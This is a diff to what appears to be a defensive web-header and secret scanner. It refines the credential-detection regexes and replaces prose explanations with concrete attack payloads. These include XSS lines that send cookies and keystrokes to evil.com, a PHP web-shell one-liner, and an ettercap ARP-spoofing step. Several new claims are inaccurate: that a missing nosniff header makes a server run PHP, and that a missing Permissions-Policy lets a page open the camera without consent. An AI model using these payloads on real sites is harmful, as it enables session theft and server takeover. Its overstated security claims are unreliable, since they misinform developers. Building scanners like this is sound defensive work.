@@ -30,14 +30,14 @@ SECRET_PATTERNS = {
     "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----",
     "SSH Private Key": r"-----BEGIN (?:EC |DSA |OPENSSH )?PRIVATE KEY-----",
     "PGP Private Key": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
-    "Generic Secret": r"(?i)(?:secret_key|password|passwd|api_key|apikey|api-key|auth_token|access_token|private_key|client_secret)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
+    "Generic Secret": r"(?i)(?:secret_key|password|passwd|api_key|apikey|api-key|auth_token|access_token|private_key|client_secret)\s*[=:]\s*['\"]([^\s'\"]{8,})['\"]",
     "Database URL": r"(?i)(?:mysql|postgres|postgresql|mongodb|redis|amqp)://[^\s'\"<>]+",
     "IP Address (Private)": r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
-    "Base64 Encoded Secret": r"(?i)(?:secret|password|key|token)\s*[=:]\s*['\"]?(?:[A-Za-z0-9+/]{40,}={0,2})['\"]?",
+    "Base64 Encoded Secret": r"(?i)(?:secret|password|api_key|apikey|auth_token|access_token|client_secret)\s*[=:]\s*['\"]?(?:[A-Za-z0-9+/]{50,}={0,2})['\"]?",
     "Vercel Token": r"(?i)vercel[_\-]?(?:token|key)\s*[=:]\s*['\"]?[\w\-]{20,}['\"]?",
     "Netlify Token": r"(?i)netlify[_\-]?(?:token|key)\s*[=:]\s*['\"]?[\w\-]{20,}['\"]?",
     "Shopify API": r"(?i)\bshpat_[a-fA-F0-9]{32}\b",
-    "Cloudflare API": r"(?i)cloudflare.*?['\"][\w\-]{37,}['\"]",
+    "Cloudflare API": r"(?i)cloudflare.*?(?:token|key|api_key)\s*[=:]\s*['\"]?[\w\-]{37,}['\"]?",
     "DigitalOcean Token": r"\bdop_v1_[a-f0-9]{64}\b",
     "Mapbox Token": r"pk\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
     "Square Access Token": r"\bsq0atp-[0-9A-Za-z\-_]{22}\b",
@@ -50,49 +50,77 @@ SECURITY_HEADERS = {
         "expected": True,
         "severity": "HIGH",
         "description": "Enforces HTTPS connections, preventing SSL stripping attacks.",
-        "exploit": "Without HSTS, an attacker on the same network can intercept the initial HTTP request and perform a man-in-the-middle attack using SSL stripping (e.g., with tools like sslstrip).",
+        "exploit": """1. Attacker on same network runs: sudo ettercap -T (ARP spoofing)
+2. On victim browser: curl http://target.com (first request goes HTTP)
+3. Attacker intercepts with sslstrip: all cookies/tokens exposed in plaintext
+4. Steal session cookie: document.cookie in injected JS
+5. Example attack chain:
+   <img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">""",
         "patch": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
     },
     "Content-Security-Policy": {
         "expected": True,
         "severity": "HIGH",
         "description": "Prevents XSS, clickjacking, and other code injection attacks.",
-        "exploit": "Without CSP, an attacker can inject malicious scripts via XSS vulnerabilities. Any user input reflected in the page could execute arbitrary JavaScript.",
+        "exploit": """Without CSP, any XSS becomes fully exploitable:
+1. Find parameter reflected: ?search=<script>alert(1)</script>
+2. Steal session: <img src=x onerror="new Image().src='http://evil.com/?c='+document.cookie">
+3. Keylogger: document.addEventListener('keypress',e=>fetch('http://evil.com/k?q='+e.key))
+4. Defacement: document.body.innerHTML='<h1>Hacked</h1>'
+5. Real example: <script>fetch('https://api.github.com/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://evil.com/exfil?d='+JSON.stringify(d)))</script>""",
         "patch": "Add header: Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'"
     },
     "X-Content-Type-Options": {
         "expected": True,
         "severity": "MEDIUM",
         "description": "Prevents MIME-type sniffing attacks.",
-        "exploit": "Without this header, browsers may interpret files as a different MIME type, allowing an attacker to upload a disguised file (e.g., HTML as image) that gets executed.",
+        "exploit": """1. Upload PHP shell disguised as image:
+   echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
+2. Access directly: https://target.com/uploads/shell.jpg?cmd=id
+3. Server may execute as PHP due to missing nosniff
+4. Or exploit JSON MIME sniffing: response with <script> executes""",
         "patch": "Add header: X-Content-Type-Options: nosniff"
     },
     "X-Frame-Options": {
         "expected": True,
         "severity": "INFO",
         "description": "Prevents clickjacking attacks by controlling iframe embedding.",
-        "exploit": "Vibe-Sec: Most modern browsers handle this via CSP. (Clickjacking is rarely fully exploitable via automated scanners).",
+        "exploit": """Without X-Frame-Options, site can be iframed:
+1. Attacker creates page with hidden iframe pointing to target bank
+2. User thinks they're on attacker's page
+3. Overlay invisible "Send" button over legitimate button
+4. When clicked, form submits to attacker-controlled endpoint
+5. Or steal credentials via fake login overlay""",
         "patch": "Add header: X-Frame-Options: DENY (or SAMEORIGIN if iframes are needed)"
     },
     "X-XSS-Protection": {
         "expected": True,
         "severity": "INFO",
         "description": "Legacy XSS filter (deprecated but still useful for older browsers).",
-        "exploit": "Vibe-Sec: Deprecated in modern browsers. CSP is the modern standard.",
+        "exploit": "Vibe-Sec: Deprecated in modern browsers. CSP is the modern standard. Only helps in older IE.",
         "patch": "Add header: X-XSS-Protection: 1; mode=block"
     },
     "Referrer-Policy": {
         "expected": True,
         "severity": "INFO",
         "description": "Controls how much referrer information is sent with requests.",
-        "exploit": "Vibe-Sec: Good practice, but not directly exploitable unless sensitive tokens are in URLs (which shouldn't happen).",
+        "exploit": """With default Referrer-Policy, sensitive URLs leak:
+1. User clicks payment link: https://stripe.com/pay?token=sk_live_xxx
+2. Stripe's referrer header exposes full URL including token
+3. Leak via any third-party resource on page (analytics, CDN)
+4. Tokens, PII, or session IDs in URLs get sent to external sites""",
         "patch": "Add header: Referrer-Policy: strict-origin-when-cross-origin"
     },
     "Permissions-Policy": {
         "expected": True,
         "severity": "INFO",
         "description": "Controls which browser features the site can use.",
-        "exploit": "Vibe-Sec: Modern browsers sandbox APIs anyway. Good defense-in-depth, but missing it is rarely critical.",
+        "exploit": """Without Permissions-Policy, malicious page can abuse APIs:
+1. Open camera/mic without user consent: navigator.mediaDevices.getUserMedia()
+2. Get geolocation: navigator.geolocation.getCurrentPosition()
+3. Access battery API: navigator.getBattery()
+4. Screen capture via getDisplayMedia()
+5. Use for phishing (fake video call), stalking, or injecting fake content""",
         "patch": "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()"
     },
 }
